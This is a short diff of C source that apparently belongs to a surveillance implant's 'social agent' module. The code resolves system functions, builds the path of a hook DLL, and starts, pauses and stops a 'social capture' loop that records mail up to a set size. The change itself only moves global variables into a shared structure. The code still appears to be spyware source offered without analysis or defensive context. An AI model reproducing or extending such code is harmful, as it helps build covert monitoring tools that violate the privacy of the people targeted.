@@ -66,7 +66,7 @@ DWORD SocialHost_Setup()
 	VALIDPTR(SocialThreadData.pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"));
 	VALIDPTR(SocialThreadData.pExitProcess = (ExitProcess_T) HM_SafeGetProcAddress(hMod, "ExitProcess"));
 
-	HM_CompletePath(H4DLLNAME, SocialThreadData.cDLLHookName);
+	HM_CompletePath(shared.H4DLLNAME, SocialThreadData.cDLLHookName);
 	_snprintf_s(SocialThreadData.cSocialMainLoop, sizeof(SocialThreadData.cSocialMainLoop), _TRUNCATE, "PPPFTBBP12");
 
 	return 0;
@@ -140,16 +140,16 @@ void StartSocialCapture()
 DWORD __stdcall PM_SocialAgentStartStop(BOOL bStartFlag, BOOL bReset)
 {	
 	if (bStartFlag) 
-		social_process_control = SOCIAL_PROCESS_CONTINUE;
+		shared.social_process_control = SOCIAL_PROCESS_CONTINUE;
 	else
-		social_process_control = SOCIAL_PROCESS_PAUSE;
+		shared.social_process_control = SOCIAL_PROCESS_PAUSE;
 		
 	return 1;
 }
 
 DWORD __stdcall PM_SocialAgentUnregister()
 {
-	social_process_control = SOCIAL_PROCESS_EXIT;
+	shared.social_process_control = SOCIAL_PROCESS_EXIT;
 	return 1;
 }
 
@@ -165,7 +165,7 @@ DWORD __stdcall PM_SocialAgentInit(JSONObject elem)
 
 void PM_SocialAgentRegister()
 {
-	social_process_control = SOCIAL_PROCESS_CONTINUE;
-	max_social_mail_len = DEFAULT_MAX_MAIL_SIZE;
+	shared.social_process_control = SOCIAL_PROCESS_CONTINUE;
+	shared.max_social_mail_len = DEFAULT_MAX_MAIL_SIZE;
 	AM_MonitorRegister(L"social", PM_SOCIALAGENT, NULL, (BYTE *)PM_SocialAgentStartStop, (BYTE *)PM_SocialAgentInit, (BYTE *)PM_SocialAgentUnregister);
 }
